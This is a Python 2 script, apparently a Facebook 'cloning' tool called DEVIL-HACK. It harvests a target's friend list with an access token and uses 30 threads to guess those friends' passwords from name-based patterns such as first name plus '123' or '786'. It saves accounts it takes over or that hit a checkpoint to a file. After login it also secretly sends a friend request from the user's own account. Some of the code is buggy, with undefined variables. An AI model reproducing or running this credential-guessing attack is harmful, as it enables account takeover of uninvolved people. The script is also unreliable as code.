#!/usr/bin/python2
#coding=utf-8
#DEVIL-HACK THE OFFICAL ROGRAMMER 
#FBCLONING COMMMAD MAKER 
#FB : RAMDANI ID


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#Dev:TECH ABM
#### LOGO ####
logo = """
⊱⋕⊰═════════════════════════════════════════⊱⋕⊰
  ╭━━━━┳━━━┳━╮╱╭┳━━━━┳━━━╮
  ┃╭╮╭╮┃╭━╮┃┃╰╮┃┃╭╮╭╮┃╭━━╯
  ╰╯┃┃╰┫┃╱┃┃╭╮╰╯┣╯┃┃╰┫╰━━╮
  ╱╱┃┃╱┃╰━╯┃┃╰╮┃┃╱┃┃╱┃╭━━╯
  ╱╱┃┃╱┃╭━╮┃┃╱┃┃┃╱┃┃╱┃╰━━╮
  ╱╱╰╯╱╰╯╱╰┻╯╱╰━╯╱╰╯╱╰━━━╯
[÷] JANGAN LUPA ADD FB GUA BANGSAD [÷]
[÷] FB : https://m.facebook.com/DEVILS69JAVHD [÷]
⊱⋕⊰═════════════════════════════════════════⊱⋕⊰
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("Please Wait "+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = "Not Vuln"
vuln = "Vuln"

os.system("clear")
print  """

       ╔═══╦═══╦╗──╔╦══╦╗
       ╚╗╔╗║╔══╣╚╗╔╝╠╣╠╣║
       ─║║║║╚══╬╗║║╔╝║║║║
       ─║║║║╔══╝║╚╝║─║║║║─╔╗
       ╔╝╚╝║╚══╗╚╗╔╝╔╣╠╣╚═╝║
       ╚═══╩═══╝─╚╝─╚══╩═══╝                       

"""

jalan("•◈•───────•◈ SELAMAT MALING •◈•───────•◈•")  

jalan("       ──╔╦═══╦═╗─╔╦═══╦═══╦═══╗")
jalan("       ──║║╔═╗║║╚╗║╠╗╔╗║╔══╣╔═╗║")
jalan("       ──║║║─║║╔╗╚╝║║║║║╚══╣╚══╗")
jalan("       ╔╗║║╚═╝║║╚╗║║║║║║╔══╩══╗║")
jalan("       ║╚╝║╔═╗║║─║║╠╝╚╝║╚══╣╚═╝║")
jalan("       ╚══╩╝─╚╩╝─╚═╩═══╩═══╩═══╝")
jalan("  SELAMAT DATANG DI NERAKA  ")
jalan("  JANGAN LUPA COLI DULU BIAR HOKI ")

jalan("•◈•──────────•◈• DEVIL-HACK •◈•──────────•◈•")

CorrectUsername = "javhd"
CorrectPassword = "javhd"

loop = 'true'
while (loop == 'true'):
    username = raw_input("[#] Enter Username ➤ ")
    if (username == CorrectUsername):
    	password = raw_input("#] Enter Password ➤ ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username  #DEV Devil-Hack
            loop = 'false'
        else:
            print "Wrong password!"
            os.system('xdg-open https://m.youtube.com/channel/UC5jned7it1eduNGSHP9C0qw')
    else:
        print "Wrong username!"
        os.system('xdg-open https://m.youtube.com/channel/UC5jned7it1eduNGSHP9C0qw')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo
	print("⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
	print ">>>[1] Login Via Akun Facebook  "
        time.sleep(0.05)
        print ">>>[2] Login Via Token Facebook "
        time.sleep(0.05)        
	print ">>>[0] Keluar        "
	print("⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
	pilih_login()

def pilih_login():
	peak = raw_input("Pilih Yang Lu Suka >>>")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()        
	elif unikers =="3":
		os.system('xdg-open https://github.com/aa1878')
		login()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()
			
		
	
def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo
		jalan("⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
		jalan('[✾] DO NOT USE OLD ACCOUNT TO LOGIN [✾]' )
		jalan('[✾] USE A FRESH/NEW ACCOUNT TO LOGIN ✾]' )
		id = raw_input('[!!] ID/Email : ')
		pwd = raw_input('[!!] Password : ')
		jalan("⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
		tik()
		try:
			br.open('https://mbasic.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				jalan( '\n\x1b[1;95mLogin Successful...') 
				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()

def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("[+] Token : Enter accees token link without Fb login>> ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("[?] Want to pick up token? [y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	jalan( "⊱⋕⊰═════════════════════════════════════════⊱⋕⊰"  ) 
	print "  [*] Name : "+nama+"  	   "                               
	print "  [*] ID  : "+id+"        "
	jalan( "\033[1;93m⊱⋕⊰═════════════════════════════════════════⊱⋕⊰") 
	print "[1] >> start Cloning "																														
	print "[0] >> Log out"
	pilih()

def pilih():
	unikers = raw_input(">>> ")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print "⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "Fill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
	jalan( "[1] >> Hack From Public ID") 
	jalan( "[0] >> Back") 
	print "⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
	pilih_super()

def pilih_super():
	peak = raw_input(">>> ")
	if peak =="":
		print "Fill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "⊱⋕⊰═══════════════════════════════════════⊱⋕⊰\n" 
		idt = raw_input("[⊱⋕⊰] Masukan ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"[⊱⋕⊰] ID Not Found!"
			raw_input("Back")
			super()
		print"[⊱⋕⊰] Getting ID Loading process........ "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "Fill in correctly"
		pilih_super()

	
	print "[⊱⋕⊰] Total IDs : "+str(len(id))
	jalan('[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("[⊱⋕⊰] Cloning"+o),;sys.stdout.flush();time.sleep(1)
	print "   ❈    To Stop Process Press CTRL+Z    ❈"
	print "⊱⋕⊰══════════════════════════════════════════⊱⋕⊰" 

	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '[OK]  ' + user  + ' | ' + pass1 + ' | ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '[CP]  ' + user  + ' | ' + pass1 + ' | ' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '[OK]  ' + user  + ' | ' + pass2 + ' | ' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '[CP]  ' + user  + ' | ' + pass2 + ' | ' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '[OK]  ' + user  + ' | ' + pass3 + ' | ' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '[CP]  ' + user  + ' | ' + pass3 + ' | ' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = b['first_name'] + '1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '[OK]  ' + user  + ' | ' + pass4 + ' | ' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '[CP]  ' + user  + ' | ' + pass4 + ' | ' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = '786786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '[OK]  ' + user  + ' | ' + pass5 + ' | ' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '[CP]  ' + user  + ' | ' + pass5 + ' | ' + b['name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '[OK]  ' + user  + ' | ' + pass6 + ' | ' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print 'CP] ' + user  + ' | ' + pass6 + ' | ' + b['name']
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'Pakistan'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '[OK]  ' + user  + ' | ' + pass7 + ' | ' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '[CP]  ' + user  + ' | ' + pass7 + ' | ' + b['name']
																	cek = open("out/CP.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)	
																												   	
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "⊱⋕⊰═════════════════════════════════⊱⋕⊰" 
	print '[÷] Process Maling Telah Selesai  ....'
	print"[÷] Total OK/CP : "+str(len(oks))+"/"+str(len(cekpoint))
	print("[÷] Hasil Maling Disimpan : save/checkpoint.txt")
	raw_input("Kembali")
	menu()

if __name__ == '__main__':
	login()